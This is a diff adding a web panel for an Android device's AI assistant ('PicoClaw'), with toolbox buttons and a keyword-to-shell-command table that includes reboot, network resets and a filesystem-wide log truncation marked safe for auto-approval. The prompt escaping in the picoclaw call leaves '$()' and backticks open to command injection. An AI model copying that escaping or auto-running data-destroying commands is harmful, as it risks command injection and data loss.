+        /* 本地工具箱按钮 */
+        .chat-local-btn {
+            font-size: 11px; padding: 8px 6px; border-radius: 8px;
+            background: rgba(255,255,255,.05); border: 1px solid rgba(255,255,255,.1);
+            color: rgba(255,255,255,.8); cursor: pointer; transition: all .2s;
+            text-align: center;
+        }
+        .chat-local-btn:hover { background: rgba(255,255,255,.1); border-color: rgba(255,255,255,.2); }
+        .chat-local-btn:active { transform: scale(0.96); }
+        .chat-local-btn._primary {
+            background: linear-gradient(135deg,#8b5cf6,#6366f1); border: none;
+            color: #fff; font-weight: bold;
+        }
+        .chat-local-btn._warn {
+            background: rgba(239,68,68,.1); border-color: rgba(239,68,68,.3);
+            color: #fca5a5;
+        }
+        .chat-cmd-output {
+            margin: 10px; padding: 10px;
+            background: rgba(0,0,0,.3); border-radius: 8px;
+            font-family: monospace; font-size: 11px;
+            color: #94a3b8; max-height: 200px;
+            overflow-y: auto; white-space: pre-wrap; word-break: break-all;
+        }
+
+        /* 安装/配置向导视图 */
+        .chat-setup-view {
+            flex: 1; display: flex; flex-direction: column; align-items: center;
+            justify-content: center; padding: 24px 20px; text-align: center;
+        }
+        .chat-setup-icon { font-size: 48px; margin-bottom: 16px; }
+        .chat-setup-title { font-size: 16px; font-weight: bold; color: #fff; margin-bottom: 8px; }
+        .chat-setup-desc { font-size: 12px; color: rgba(255,255,255,.45); line-height: 1.6; margin-bottom: 20px; }
+        .chat-setup-steps { width: 100%; max-width: 280px; margin-bottom: 20px; text-align: left; }
+        .chat-step { display: flex; gap: 12px; padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,.05); }
+        .chat-step:last-child { border-bottom: none; }
+        .chat-step-num {
+            width: 24px; height: 24px; border-radius: 50%; flex-shrink: 0;
+            background: linear-gradient(135deg, #8b5cf6, #6366f1);
+            display: flex; align-items: center; justify-content: center;
+            font-size: 12px; font-weight: bold; color: #fff;
+        }
+        .chat-step-text { flex: 1; }
+        .chat-step-title { font-size: 12px; font-weight: bold; color: rgba(255,255,255,.8); margin-bottom: 2px; }
+        .chat-step-desc { font-size: 11px; color: rgba(255,255,255,.35); line-height: 1.4; }
+        .chat-setup-actions { display: flex; flex-direction: column; gap: 8px; width: 100%; max-width: 240px; }
+        .chat-setup-btn {
+            padding: 10px 16px; border-radius: 10px; font-size: 13px;
+            font-weight: bold; cursor: pointer; border: none; transition: all .2s;
+        }
+        .chat-setup-btn:active { transform: scale(.97); }
+        .chat-setup-btn._primary {
+            background: linear-gradient(135deg, #22c55e, #16a34a); color: #fff;
+        }
+        .chat-setup-btn._secondary {
+            background: rgba(99,102,241,.15); color: #a5b4fc;
+            border: 1px solid rgba(99,102,241,.3);
+        }
+        .chat-setup-btn._secondary:hover { background: rgba(99,102,241,.25); }
+
+        /* API Key 输入框 */
+        .chat-api-input {
+            width: 100%; box-sizing: border-box;
+            background: rgba(255,255,255,.06); border: 1px solid rgba(255,255,255,.1);
+            border-radius: 8px; padding: 8px 10px; color: #fff; font-size: 12px;
+            outline: none; font-family: inherit;
+        }
+        .chat-api-input:focus { border-color: rgba(139,92,246,.5); background: rgba(255,255,255,.08); }
+        .chat-api-select {
+            width: 100%; box-sizing: border-box;
+            background: rgba(255,255,255,.06); border: 1px solid rgba(255,255,255,.1);
+            border-radius: 8px; padding: 8px 10px; color: #fff; font-size: 12px;
+            outline: none;
+        }
+        .chat-api-select:focus { border-color: rgba(139,92,246,.5); }
+        .chat-api-select option { background: #1e1e2e; color: #fff; }
+
+        /* 进度条 */
+        .chat-progress-bar {
+            width: 100%; height: 6px; background: rgba(255,255,255,.08);
+            border-radius: 3px; overflow: hidden;
+        }
+        .chat-progress-fill {
+            height: 100%; width: 0%;
+            background: linear-gradient(90deg, #22c55e, #16a34a);
+            border-radius: 3px; transition: width .3s ease;
+        }
+        `
+        document.head.appendChild(style)
+
+        // ---- 创建面板 ----
+        var overlay = document.createElement('div')
+        overlay.id = 'smart_ai_overlay'
+        document.body.appendChild(overlay)
+
+        var panel = document.createElement('div')
+        panel.id = 'smart_ai_panel'
+        panel.innerHTML = `
+            <div class="ai-header">
+                <span class="ai-title">🤖 AI 智能助手</span>
+                <button class="ai-close" id="ai_close_btn">×</button>
+            </div>
+
+            <!-- Tab 切换 -->
+            <div class="ai-tabs">
+                <div class="ai-tab _active" data-tab="assistant">🛠️ 智能助手</div>
+                <div class="ai-tab" data-tab="chat">💬 PicoClaw 聊天</div>
+            </div>
+
+            <!-- Tab 1：智能助手（原有功能） -->
+            <div class="ai-tab-content _active" id="ai_tab_assistant">
+
+            <div class="ai-section">
+                <div style="display:flex;gap:8px;margin-bottom:10px;">
+                    <button class="ai-btn ai-btn-start" id="ai_start_btn" style="flex:1">▶ 启动巡检</button>
+                    <button class="ai-btn ai-btn-scan" id="ai_scan_now_btn" style="flex:1">🔍 立即检查</button>
+                </div>
+                <button class="ai-btn ai-btn-deep" id="ai_deep_diag_btn" style="width:100%;margin-bottom:10px;background:linear-gradient(135deg,#8b5cf6,#6366f1);">
+                    🦞 AI 深度诊断（PicoClaw）
+                </button>
+                <div class="ai-switch-row" style="margin-bottom:8px">
+                    <span class="ai-switch-label">显示AI悬浮按钮</span>
+                    <div class="ai-switch _on" id="ai_fab_switch"></div>
+                </div>
+                <div class="ai-switch-row" style="margin-bottom:8px">
+                    <span class="ai-switch-label">自动批准低风险安全命令（清缓存等）</span>
+                    <div class="ai-switch" id="ai_auto_approve_switch"></div>
+                </div>
+                <div class="ai-hint">AI 发现问题后会将要执行的命令放入下方待审批队列，你同意后才会执行。网络方面只通知建议，不做任何限速操作。</div>
+            </div>
+
+            <div class="ai-section" style="border-top:1px solid rgba(167,139,250,.1)">
+                <div class="ai-section-title">📡 网络状态监控 <span class="ai-badge _0" id="ai_net_badge"></span></div>
+                <div class="ai-status-card">
+                    <div class="ai-status-row">
+                        <span>延迟</span>
+                        <span class="ai-status-val _info" id="ai_net_ping">-</span>
+                    </div>
+                    <div class="ai-status-row">
+                        <span>丢包率</span>
+                        <span class="ai-status-val _info" id="ai_net_loss">-</span>
+                    </div>
+                    <div class="ai-status-row">
+                        <span>DNS解析</span>
+                        <span class="ai-status-val _info" id="ai_net_dns">-</span>
+                    </div>
+                    <div class="ai-status-row">
+                        <span>状态评估</span>
+                        <span class="ai-status-val _info" id="ai_net_status">未检测</span>
+                    </div>
+                    <div class="ai-status-row">
+                        <span>AI建议</span>
+                        <span style="font-size:11px;color:rgba(255,255,255,.5);text-align:right;max-width:200px" id="ai_net_suggestion">-</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="ai-section" style="border-top:1px solid rgba(167,139,250,.1)">
+                <div class="ai-section-title">
+                    💻 AI 代码任务
+                    <span style="font-size:10px;color:rgba(255,255,255,.3);font-weight:normal">描述任务，AI生成命令，批准后执行</span>
+                </div>
+                <div style="display:flex;gap:6px;margin-bottom:8px;">
+                    <input type="text" class="ai-input" id="ai_task_input" placeholder="例：清理日志文件 / 查看CPU占用 / 重启网络..." style="flex:1" />
+                    <button class="ai-btn ai-btn-execall" id="ai_gen_btn" style="background:linear-gradient(135deg,#10b981,#059669);flex-shrink:0">生成命令</button>
+                </div>
+                <div id="ai_task_result" style="display:none;margin-bottom:8px">
+                    <div style="font-size:11px;color:rgba(255,255,255,.4);margin-bottom:4px">AI生成的命令（请仔细审查）：</div>
+                    <div class="ai-cmd-box" id="ai_task_cmd_display" style="font-family:monospace;font-size:12px;background:rgba(0,0,0,.3);padding:8px 10px;border-radius:8px;border:1px solid rgba(255,255,255,.08);word-break:break-all;white-space:pre-wrap;margin-bottom:6px"></div>
+                    <div style="display:flex;gap:6px;">
+                        <button class="ai-btn ai-btn-approve" id="ai_task_exec_btn" style="flex:1">✅ 批准执行</button>
+                        <button class="ai-btn ai-btn-reject" id="ai_task_cancel_btn">取消</button>
+                    </div>
+                </div>
+                <div id="ai_task_loading" style="display:none;text-align:center;padding:12px;color:rgba(255,255,255,.4);font-size:12px">🤖 AI正在生成命令...</div>
+            </div>
+
+            <div class="ai-section" style="border-top:1px solid rgba(167,139,250,.1)">
+                <div class="ai-section-title">
+                    🔧 待审批命令
+                    <span class="ai-badge _0" id="ai_pending_badge">0</span>
+                </div>
+                <div id="ai_pending_container" style="max-height:300px;overflow-y:auto;margin-bottom:8px">
+                    <div class="ai-empty">暂无待执行命令，AI巡检发现问题后会在此建议</div>
+                </div>
+                <button class="ai-btn ai-btn-execall" id="ai_approve_all_btn" style="width:100%;display:none">✅ 全部批准执行</button>
+            </div>
+
+            <div class="ai-section" style="border-top:1px solid rgba(167,139,250,.1)">
+                <div class="ai-section-title">📋 AI 日志</div>
+                <div class="ai-log-area" id="ai_log_area">
+                    <div class="ai-empty">AI未启动</div>
+                </div>
+            </div>
+
+            <div class="ai-section" style="border-top:1px solid rgba(167,139,250,.1)">
+                <div class="ai-section-title">📊 巡检统计</div>
+                <div class="ai-status-card">
+                    <div class="ai-status-row"><span>巡检次数</span><span class="ai-status-val _info" id="ai_scan_count">0</span></div>
+                    <div class="ai-status-row"><span>发现问题</span><span class="ai-status-val _warn" id="ai_issues_count">0</span></div>
+                    <div class="ai-status-row"><span>已执行命令</span><span class="ai-status-val _good" id="ai_exec_count">0</span></div>
+                    <div class="ai-status-row"><span>运行状态</span><span class="ai-status-val _bad" id="ai_run_status">未启动</span></div>
+                </div>
+            </div>
+
+            </div><!-- /ai_tab_assistant -->
+
+            <!-- Tab 2：PicoClaw 聊天 -->
+            <div class="ai-tab-content" id="ai_tab_chat">
+                <div class="chat-status-bar">
+                    <div>
+                        <span class="chat-status-dot" id="picoclaw_status_dot"></span>
+                        <span id="picoclaw_status_text">检测中...</span>
+                    </div>
+                    <div id="picoclaw_status_actions" style="display:flex;gap:6px;">
+                        <button id="picoclaw_open_panel" style="font-size:10px;padding:2px 8px;border-radius:6px;background:rgba(99,102,241,.2);border:1px solid rgba(99,102,241,.3);color:#a5b4fc;cursor:pointer">打开面板</button>
+                    </div>
+                </div>
+                <div class="chat-container">
+                    <!-- 安装向导（未安装时显示） -->
+                    <div class="chat-setup-view" id="chat_setup_install">
+                        <div class="chat-setup-icon">📦</div>
+                        <div class="chat-setup-title">一键安装 PicoClaw</div>
+                        <div class="chat-setup-desc">
+                            AI 助手功能需要 PicoClaw 驱动<br/>
+                            点击下方按钮自动完成安装
+                        </div>
+
+                        <!-- API Key 输入 -->
+                        <div style="width:100%;max-width:280px;margin-bottom:16px;text-align:left">
+                            <div style="font-size:11px;color:rgba(255,255,255,.5);margin-bottom:4px">API Key（可选，安装后配置）</div>
+                            <input type="text" class="chat-api-input" id="pc_api_key_input" placeholder="输入你的 LLM API Key（如 DeepSeek）" />
+                            <div style="font-size:10px;color:rgba(255,255,255,.3);margin-top:4px">
+                                支持 DeepSeek、OpenAI、硅基流动等 30+ 服务商
+                            </div>
+                        </div>
+
+                        <!-- API 服务商选择 -->
+                        <div style="width:100%;max-width:280px;margin-bottom:12px;text-align:left">
+                            <div style="font-size:11px;color:rgba(255,255,255,.5);margin-bottom:4px">AI 服务商</div>
+                            <select class="chat-api-select" id="pc_provider_select">
+                                <option value="deepseek">DeepSeek（推荐）</option>
+                                <option value="siliconflow">硅基流动（有免费额度）</option>
+                                <option value="openai">OpenAI</option>
+                                <option value="dashscope">阿里云百炼</option>
+                                <option value="custom">自定义（其他）</option>
+                            </select>
+                        </div>
+
+                        <!-- 免费方案提示 -->
+                        <div style="width:100%;max-width:280px;margin-bottom:16px;padding:10px 12px;background:rgba(59,130,246,.1);border:1px solid rgba(59,130,246,.3);border-radius:8px;text-align:left">
+                            <div style="font-size:11px;color:#60a5fa;font-weight:bold;margin-bottom:4px">💡 免费方案推荐</div>
+                            <div style="font-size:10px;color:rgba(255,255,255,.6);line-height:1.5">
+                                硅基流动(SiliconFlow)每日提供免费额度，注册即可使用：<br/>
+                                <span style="color:#93c5fd">https://cloud.siliconflow.cn</span>
+                            </div>
+                        </div>
+
+                        <div class="chat-setup-actions" style="width:100%;max-width:280px">
+                            <button class="chat-setup-btn _primary" id="pc_oneclick_install_btn">🚀 一键安装 PicoClaw</button>
+                            <button class="chat-setup-btn _secondary" id="pc_open_plugin_btn">🦞 从小龙虾APP提取</button>
+                        </div>
+
+                        <!-- 安装进度 -->
+                        <div class="chat-install-progress" id="chat_install_progress" style="display:none;width:100%;max-width:280px;margin-top:16px;text-align:left">
+                            <div style="font-size:11px;color:rgba(255,255,255,.5);margin-bottom:6px" id="pc_install_status">准备中...</div>
+                            <div class="chat-progress-bar">
+                                <div class="chat-progress-fill" id="pc_progress_fill"></div>
+                            </div>
+                            <div style="font-size:10px;color:rgba(255,255,255,.3);margin-top:6px" id="pc_install_log">点击开始安装</div>
+                        </div>
+                    </div>
+
+                    <!-- 配置向导（已安装但未配置/未运行时显示） -->
+                    <div class="chat-setup-view" id="chat_setup_config" style="display:none">
+                        <div class="chat-setup-icon">⚙️</div>
+                        <div class="chat-setup-title">配置 AI 服务商</div>
+                        <div class="chat-setup-desc">
+                            PicoClaw 已安装，输入 API Key<br/>
+                            一键配置，立即使用
+                        </div>
+
+                        <!-- API Key 输入 -->
+                        <div style="width:100%;max-width:280px;margin-bottom:12px;text-align:left">
+                            <div style="font-size:11px;color:rgba(255,255,255,.5);margin-bottom:4px">API Key</div>
+                            <input type="text" class="chat-api-input" id="pc_config_api_input" placeholder="输入你的 API Key" />
+                        </div>
+
+                        <!-- API 服务商选择 -->
+                        <div style="width:100%;max-width:280px;margin-bottom:12px;text-align:left">
+                            <div style="font-size:11px;color:rgba(255,255,255,.5);margin-bottom:4px">AI 服务商</div>
+                            <select class="chat-api-select" id="pc_config_provider_select">
+                                <option value="deepseek">DeepSeek（推荐）</option>
+                                <option value="siliconflow">硅基流动（有免费额度）</option>
+                                <option value="openai">OpenAI</option>
+                                <option value="dashscope">阿里云百炼</option>
+                                <option value="custom">自定义（其他）</option>
+                            </select>
+                        </div>
+
+                        <!-- 免费方案提示 -->
+                        <div style="width:100%;max-width:280px;margin-bottom:16px;padding:10px 12px;background:rgba(59,130,246,.1);border:1px solid rgba(59,130,246,.3);border-radius:8px;text-align:left">
+                            <div style="font-size:11px;color:#60a5fa;font-weight:bold;margin-bottom:4px">💡 免费方案推荐</div>
+                            <div style="font-size:10px;color:rgba(255,255,255,.6);line-height:1.5">
+                                硅基流动(SiliconFlow)每日提供免费额度，注册即可使用：<br/>
+                                <span style="color:#93c5fd">https://cloud.siliconflow.cn</span>
+                            </div>
+                        </div>
+
+                        <div class="chat-setup-actions" style="width:100%;max-width:280px">
+                            <button class="chat-setup-btn _primary" id="pc_quick_config_btn">🔑 一键配置 API</button>
+                            <button class="chat-setup-btn _secondary" id="pc_open_config_btn">📋 打开配置面板</button>
+                            <div style="display:flex;gap:8px">
+                                <button class="chat-setup-btn _secondary" id="pc_retry_check_btn" style="flex:1">🔄 重新检测</button>
+                                <button class="chat-setup-btn _secondary" id="pc_diagnose_btn" style="flex:1;background:linear-gradient(135deg,#f59e0b,#d97706);">🔍 诊断</button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- 聊天消息区域（正常使用时显示） -->
+                    <div class="chat-messages" id="chat_messages" style="display:none">
+                        <div class="chat-empty" id="chat_empty">
+                            <div class="chat-empty-icon">🦞</div>
+                            <div class="chat-empty-title">PicoClaw AI 助手</div>
+                            <div class="chat-empty-desc">
+                                可以执行命令、查询信息、调试问题<br/>
+                                试试下面的快捷操作吧 👇
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- 本地工具箱模式（无API时显示） -->
+                    <div class="chat-local-tools" id="chat_local_tools" style="display:none;padding:12px;overflow-y:auto;max-height:60vh">
+                        <div style="text-align:center;margin-bottom:16px">
+                            <div style="font-size:36px;margin-bottom:8px">🔧</div>
+                            <div style="font-size:16px;font-weight:bold;color:#fff">本地工具箱</div>
+                            <div style="font-size:12px;color:rgba(255,255,255,.5);margin-top:4px">无需 AI · 点击直接执行</div>
+                        </div>
+                        
+                        <!-- 系统信息 -->
+                        <div style="margin-bottom:14px">
+                            <div style="font-size:11px;color:rgba(255,255,255,.4);margin-bottom:6px;padding-left:4px">📊 系统信息</div>
+                            <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px">
+                                <button class="chat-local-btn" data-cmd="uname -a && echo '---' && cat /proc/version 2>/dev/null | cut -c1-80">系统版本</button>
+                                <button class="chat-local-btn" data-cmd="cat /proc/cpuinfo 2>/dev/null | grep 'model name' | head -1 && echo '---' && cat /proc/cpuinfo 2>/dev/null | grep 'BogoMIPS' | head -1">CPU 信息</button>
+                                <button class="chat-local-btn" data-cmd="cat /proc/meminfo 2>/dev/null | head -6">内存信息</button>
+                                <button class="chat-local-btn" data-cmd="df -h / /data 2>/dev/null">存储空间</button>
+                                <button class="chat-local-btn" data-cmd="cat /sys/class/thermal/thermal_zone0/temp 2>/dev/null && echo '°C (原始值)' && cat /sys/class/thermal/thermal_zone1/temp 2>/dev/null && echo '°C (zone1)'">温度信息</button>
+                                <button class="chat-local-btn" data-cmd="uptime && echo '---' && cat /proc/uptime 2>/dev/null">运行时长</button>
+                            </div>
+                        </div>
+                        
+                        <!-- 网络工具 -->
+                        <div style="margin-bottom:14px">
+                            <div style="font-size:11px;color:rgba(255,255,255,.4);margin-bottom:6px;padding-left:4px">📡 网络工具</div>
+                            <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px">
+                                <button class="chat-local-btn" data-cmd="ip addr show 2>/dev/null | grep 'inet ' | head -10">IP 地址</button>
+                                <button class="chat-local-btn" data-cmd="ip route show 2>/dev/null && echo '---DNS---' && getprop net.dns1 2>/dev/null && getprop net.dns2 2>/dev/null">路由/DNS</button>
+                                <button class="chat-local-btn" data-cmd="ping -c 3 -W 2 223.5.5.5 2>&1">网络连通性</button>
+                                <button class="chat-local-btn" data-cmd="ping -c 2 -W 3 baidu.com 2>&1">DNS 解析</button>
+                                <button class="chat-local-btn" data-cmd="netstat -tlnp 2>/dev/null | head -15 || ss -tlnp 2>/dev/null | head -15">端口监听</button>
+                                <button class="chat-local-btn" data-cmd="cat /proc/net/dev 2>/dev/null | head -10">网卡流量</button>
+                            </div>
+                        </div>
+                        
+                        <!-- 清理优化 -->
+                        <div style="margin-bottom:14px">
+                            <div style="font-size:11px;color:rgba(255,255,255,.4);margin-bottom:6px;padding-left:4px">🧹 清理优化</div>
+                            <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px">
+                                <button class="chat-local-btn" data-cmd="sync && echo 3 > /proc/sys/vm/drop_caches 2>/dev/null && echo '缓存已清理'">清理缓存</button>
+                                <button class="chat-local-btn" data-cmd="du -sh /data/local/tmp/* 2>/dev/null | sort -rh | head -10">大文件排查</button>
+                                <button class="chat-local-btn" data-cmd="ps -ef 2>/dev/null | head -15 || ps 2>/dev/null | head -15">进程列表</button>
+                                <button class="chat-local-btn" data-cmd="top -bn1 2>/dev/null | head -15">资源占用 TOP</button>
+                            </div>
+                        </div>
+                        
+                        <!-- 设备控制 -->
+                        <div style="margin-bottom:14px">
+                            <div style="font-size:11px;color:rgba(255,255,255,.4);margin-bottom:6px;padding-left:4px">⚙️ 设备控制</div>
+                            <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px">
+                                <button class="chat-local-btn _warn" data-cmd="reboot">重启设备</button>
+                                <button class="chat-local-btn _warn" data-cmd="svc wifi disable && svc wifi enable 2>/dev/null || echo '需要系统权限'">重启网络</button>
+                            </div>
+                        </div>
+                        
+                        <!-- 配置 AI 入口 -->
+                        <div style="text-align:center;padding-top:8px;border-top:1px solid rgba(255,255,255,.1)">
+                            <div style="font-size:11px;color:rgba(255,255,255,.3);margin-bottom:8px">想要 AI 智能分析？</div>
+                            <button class="chat-local-btn _primary" id="local_goto_config_btn" style="width:100%;max-width:200px">🔑 配置 API Key 启用 AI</button>
+                        </div>
+                    </div>
+                    
+                    <!-- 命令输出显示区域 -->
+                    <div class="chat-cmd-output" id="chat_cmd_output" style="display:none;margin:10px;padding:10px;background:rgba(0,0,0,.3);border-radius:8px;font-family:monospace;font-size:11px;color:#94a3b8;max-height:200px;overflow-y:auto;white-space:pre-wrap;word-break:break-all"></div>
+                    
+                    <div class="chat-quick-actions" id="chat_quick_actions" style="display:none">
+                        <button class="chat-quick-btn" data-q="查看系统信息">📊 系统信息</button>
+                        <button class="chat-quick-btn" data-q="清理缓存">🧹 清理缓存</button>
+                        <button class="chat-quick-btn" data-q="查看网络状态">📡 网络状态</button>
+                        <button class="chat-quick-btn" data-q="查看温度">🌡️ 温度信息</button>
+                        <button class="chat-quick-btn" data-q="深度诊断设备问题">🔧 深度诊断</button>
+                        <button class="chat-quick-btn" data-q="生成流量查询命令">📶 查流量</button>
+                    </div>
+                    <div class="chat-input-area" id="chat_input_area" style="display:none">
+                        <textarea class="chat-input" id="chat_input" placeholder="输入消息，回车发送，Shift+回车换行..." rows="1"></textarea>
+                        <button class="chat-send-btn" id="chat_send_btn">发送</button>
+                    </div>
+                </div>
+            </div><!-- /ai_tab_chat -->
+        `
+        document.body.appendChild(panel)
+
+        // ---- 悬浮按钮 ----
+        var fab = document.createElement('button')
+        fab.id = 'smart_ai_fab'
+        fab.innerHTML = '🤖<span class="fab-badge _0" id="ai_fab_badge"></span>'
+        fab.onclick = function() { toggleAIPanel() }
+        document.body.appendChild(fab)
+
+        // ---- 待执行命令管理 ----
+        var addPendingCommand = function(command, description, reason, category, isSafe) {
+            // 检查是否已存在相同命令（避免重复）
+            for (var i = 0; i < _pendingCommands.length; i++) {
+                if (_pendingCommands[i].command === command && _pendingCommands[i].status === 'pending') {
+                    return // 已存在待执行的相同命令
+                }
+            }
+            var cmd = {
+                id: _cmdIdCounter++,
+                command: command,
+                description: description,
+                reason: reason,
+                category: category || 'system',
+                status: 'pending',
+                isSafe: !!isSafe,
+                result: '',
+                timestamp: Date.now()
+            }
+            _pendingCommands.push(cmd)
+            if (_pendingCommands.length > 50) _pendingCommands.shift()
+            _issuesFound++
+            renderPendingCommands()
+            updateStats()
+
+            // 自动批准安全命令
+            if (_autoApproveSafe && isSafe) {
+                aiLog('安全命令自动批准: ' + description, 'success')
+                setTimeout(function() { executeCommand(cmd.id) }, 500)
+            } else {
+                aiLog('发现待处理问题: ' + reason, 'warn')
+                showToast('AI发现问题: ' + description, 'red', 4000)
+                updateFAB()
+            }
+        }
+
+        var executeCommand = async function(id) {
+            var cmd = null
+            for (var i = 0; i < _pendingCommands.length; i++) {
+                if (_pendingCommands[i].id === id) { cmd = _pendingCommands[i]; break }
+            }
+            if (!cmd || cmd.status !== 'pending') return
+            var _rs = getShell()
+            if (!_rs) { aiLog('Shell不可用，无法执行', 'error'); return }
+
+            aiLog('正在执行: ' + cmd.description, 'info')
+            try {
+                var res = await _rs(cmd.command + ' 2>&1; echo __EXIT__$?')
+                var output = (res && res.content) || ''
+                var exitMatch = output.match(/__EXIT__(-?\d+)/)
+                var exitCode = exitMatch ? parseInt(exitMatch[1]) : -1
+                var realOutput = output.replace(/__EXIT__-?\d+/, '').trim()
+
+                if (exitCode === 0) {
+                    cmd.status = 'done'
+                    cmd.result = realOutput.substring(0, 200) || '执行成功'
+                    aiLog('执行成功: ' + cmd.description, 'success')
+                } else {
+                    cmd.status = 'failed'
+                    cmd.result = (realOutput || '退出码 ' + exitCode).substring(0, 200)
+                    aiLog('执行失败: ' + cmd.description + ' (' + cmd.result + ')', 'error')
+                }
+            } catch(e) {
+                cmd.status = 'failed'
+                cmd.result = String(e).substring(0, 200)
+                aiLog('执行异常: ' + cmd.description, 'error')
+            }
+            renderPendingCommands()
+            updateStats()
+            updateFAB()
+        }
+
+        var rejectCommand = function(id) {
+            for (var i = 0; i < _pendingCommands.length; i++) {
+                if (_pendingCommands[i].id === id) {
+                    _pendingCommands[i].status = 'rejected'
+                    aiLog('已拒绝: ' + _pendingCommands[i].description, 'info')
+                    break
+                }
+            }
+            renderPendingCommands()
+            updateFAB()
+        }
+
+        var approveAllPending = function() {
+            var count = 0
+            for (var i = 0; i < _pendingCommands.length; i++) {
+                if (_pendingCommands[i].status === 'pending') {
+                    (function(id) { setTimeout(function() { executeCommand(id) }, count * 1500) })(_pendingCommands[i].id)
+                    count++
+                }
+            }
+            if (count > 0) {
+                showToast('正在执行 ' + count + ' 条已批准命令...', 'pink', 3000)
+            }
+        }
+
+        // ---- AI 代码任务生成 ----
+        var _currentTaskCmd = null
+        var _aiGenCount = 0
+
+        // 智能命令模板（基于关键词匹配生成）
+        var commandTemplates = [
+            { pattern: /清理.*日志|日志.*清理|清除.*日志|清日志/, cmd: 'find / -name "*.log" -size +50M 2>/dev/null -exec truncate -s 0 {} \\;', desc: '清理大于50M的日志文件', category: 'system', isSafe: true },
+            { pattern: /清.*缓存|缓存.*清理|释放缓存|清缓存/, cmd: 'sync && echo 3 > /proc/sys/vm/drop_caches', desc: '释放系统缓存', category: 'memory', isSafe: true },
+            { pattern: /重启.*网络|网络.*重启|重启wifi|重启WiFi|重启WIFI/, cmd: 'svc wifi disable && sleep 2 && svc wifi enable', desc: '重启WiFi网络', category: 'network', isSafe: false },
+            { pattern: /查看.*CPU|CPU.*占用|cpu使用率|进程.*占用/, cmd: 'top -bn1 | head -20', desc: '查看CPU占用前20进程', category: 'system', isSafe: true },
+            { pattern: /查看.*内存|内存.*使用|内存情况|free -m/, cmd: 'cat /proc/meminfo | head -10 && echo "---" && free -m 2>/dev/null', desc: '查看内存使用情况', category: 'memory', isSafe: true },
+            { pattern: /查看.*存储|存储.*情况|磁盘.*空间|df -h/, cmd: 'df -h 2>/dev/null', desc: '查看存储使用情况', category: 'storage', isSafe: true },
+            { pattern: /查看.*温度|温度.*情况|CPU温度|电池温度/, cmd: 'cat /sys/class/thermal/thermal_zone0/temp 2>/dev/null; echo "---电池---"; dumpsys battery 2>/dev/null | head -10', desc: '查看CPU和电池温度', category: 'system', isSafe: true },
+            { pattern: /重启.*设备|重启手机|重启系统|reboot/, cmd: 'reboot', desc: '重启设备', category: 'system', isSafe: false },
+            { pattern: /关机|poweroff|shutdown/, cmd: 'reboot -p', desc: '关机', category: 'system', isSafe: false },
+            { pattern: /网络.*测试|测网速|网速测试|ping测试|网络延迟/, cmd: 'ping -c 5 -W 2 223.5.5.5 2>&1', desc: '测试网络延迟（ping阿里DNS）', category: 'network', isSafe: true },
+            { pattern: /DNS.*设置|修改DNS|更换DNS|改DNS/, cmd: 'setprop net.dns1 223.5.5.5 && setprop net.dns2 8.8.8.8', desc: '设置DNS为阿里+Google', category: 'network', isSafe: true },
+            { pattern: /查看.*应用|应用.*列表|已安装.*应用|包名列表/, cmd: 'pm list packages 2>/dev/null | head -50', desc: '列出已安装应用前50个', category: 'system', isSafe: true },
+            { pattern: /卸载.*应用|删除.*应用|卸载app/, cmd: '', desc: '请提供具体包名', category: 'system', isSafe: false, needsParam: true, paramHint: '包名' },
+            { pattern: /停止.*服务|杀掉.*进程|kill.*进程|结束.*进程/, cmd: '', desc: '请提供进程名或PID', category: 'system', isSafe: false, needsParam: true, paramHint: '进程名/PID' },
+            { pattern: /查看.*电量|电池.*信息|电量.*情况/, cmd: 'dumpsys battery 2>/dev/null', desc: '查看电池详细信息', category: 'battery', isSafe: true },
+            { pattern: /截图|截屏|screen.*shot/, cmd: 'screencap -p /sdcard/screenshot_$(date +%Y%m%d_%H%M%S).png && echo "已保存到/sdcard/"', desc: '截图并保存到sdcard', category: 'system', isSafe: true },
+            { pattern: /查看.*文件|文件.*列表|ls.*目录/, cmd: 'ls -la /sdcard/ 2>/dev/null | head -30', desc: '列出sdcard根目录文件', category: 'storage', isSafe: true },
+            { pattern: /备份.*配置|配置.*备份|导出.*设置/, cmd: 'echo "---系统属性---" && getprop | grep -E "ro.build|ro.product" | head -20', desc: '导出系统配置信息', category: 'system', isSafe: true },
+            { pattern: /修复.*网络|网络.*修复|重置.*网络/, cmd: 'svc wifi disable && svc data disable && sleep 3 && svc wifi enable && svc data enable', desc: '重置网络连接（WiFi+数据）', category: 'network', isSafe: false },
+            { pattern: /查看.*日志|系统日志|logcat|抓取日志/, cmd: 'logcat -d -t 100 2>/dev/null', desc: '抓取最近100行系统日志', category: 'system', isSafe: true }
+        ]
+
+        var generateCommand = async function(taskDesc) {
+            _aiGenCount++
+            var desc = taskDesc.trim()
+            if (!desc) return null
+
+            aiLog('🤖 AI分析任务: ' + desc, 'info')
+
+            // 1. 先匹配内置模板
+            for (var i = 0; i < commandTemplates.length; i++) {
+                if (commandTemplates[i].pattern.test(desc)) {
+                    var tpl = commandTemplates[i]
+                    if (tpl.needsParam) {
+                        return {
+                            command: '',
+                            description: tpl.desc + '（需要' + tpl.paramHint + '）',
+                            reason: '检测到关键词匹配，需要补充参数',
+                            category: tpl.category,
+                            isSafe: tpl.isSafe,
+                            needsParam: true,
+                            paramHint: tpl.paramHint
+                        }
+                    }
+                    return {
+                        command: tpl.cmd,
+                        description: tpl.desc,
+                        reason: '根据任务描述智能匹配：' + desc,
+                        category: tpl.category,
+                        isSafe: tpl.isSafe
+                    }
+                }
+            }
+
+            // 2. 优先尝试 PicoClaw（小龙虾）生成命令（如果已安装）
+            var _rs = getShell()
+            if (_rs && typeof _picoclawInstalled !== 'undefined' && _picoclawInstalled) {
+                try {
+                    var pcPrompt = '你是一个Linux/Android Shell命令生成专家。用户需求：' + desc + '\n请只输出一条Shell命令，不要解释，不要markdown代码块，直接输出命令本身。命令必须在Android shell环境下可用。'
+                    var escapedPrompt = pcPrompt.replace(/'/g, "'\\''").replace(/"/g, '\\"')
+                    var pcCmd = 'cd ' + _picoclawPath + ' && env ' + _picoclawHomeEnv + ' ' + _picoclawSslEnv + ' ./picoclaw agent -m "' + escapedPrompt + '" 2>&1'
+                    var pcRes = await _rs(pcCmd, 30000)
